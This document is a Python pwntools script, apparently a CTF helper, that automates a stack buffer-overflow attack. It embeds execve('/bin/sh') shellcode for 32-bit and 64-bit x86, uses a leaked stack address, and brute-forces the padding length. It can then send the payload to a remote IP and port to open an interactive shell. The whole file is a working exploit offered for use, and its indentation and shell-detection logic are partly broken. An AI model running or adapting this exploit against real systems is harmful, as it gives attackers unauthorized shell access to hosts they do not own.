import sys
from pwn import*

def binary_exploit(binary_name, exploit_data, binary_data, recv_check):

    	shellcode_32bit = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' # 25bit
    	shellcode_64bit = '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05' #23bit

    	i = 1

    	if recv_check == 'yes':

    		recv_str = raw_input('recv string data : ').rstrip('\n')
    		newline = raw_input('remove newline ? (yes or no) : ').rstrip('\n')

    		if newline == 'yes':
        		recv_str = recv_str.rstrip('\n')

	if exploit_data == 'local':

		while i < 10000:

			context.log_level = 'debug'
			print("roop " , i )
			p = process('./'+binary_name)

			if recv_check == 'yes':
				p.recvuntil(recv_str)
		    
			if binary_data == 32:
				addr = p32(int(p.recv(10),16))
				payload = shellcode_32bit
			elif binary_data == 64:
				addr = p64(int(p.recv(14),16))
				payload = shellcode_64bit

			payload += 'A'*i
			payload += 'B'*4
			payload += addr

			p.sendline(payload)
			sleep(0.1)
		
			try:
				p.sendline('ls >> output2.txt')
		
			except:
				i += 1
			else:
				p.interactive()
				break

	elif exploit_data == 'remote':

		ip = raw_input('IP : ').rstrip('\n')
		port = int(input('PORT : '))
		
		while i < 10000:

			context.log_level = 'debug'
			print("roop " , i )
			p = process('./'+binary_name)

			if recv_check == 'yes':
				p.recvuntil(recv_str)
		    
			if binary_data == 32:
				addr = p32(int(p.recv(10),16))
				payload = shellcode_32bit
			elif binary_data == 64:
				addr = p64(int(p.recv(14),16))
				payload = shellcode_64bit
			

			payload += 'A'*i
			payload += 'B'*4
			payload += addr

			p.sendline(payload)
			sleep(0.1)
		
			try:
				p.sendline('ls >> output2.txt')
		
			except:
				i += 1
			else:
				break
	
		r = remote(ip,port)
	
		r.sendline(payload)
		r.interactive()



binary_name = raw_input('binary name : ').rstrip('\n')
binary_data = int(input('32 bit or 64 bit : '))
exploit_data = raw_input('local or remote : ').rstrip('\n')
recv_check = raw_input('recv str ? (yes or no) : ').rstrip('\n')


binary_exploit(binary_name, exploit_data, binary_data, recv_check)


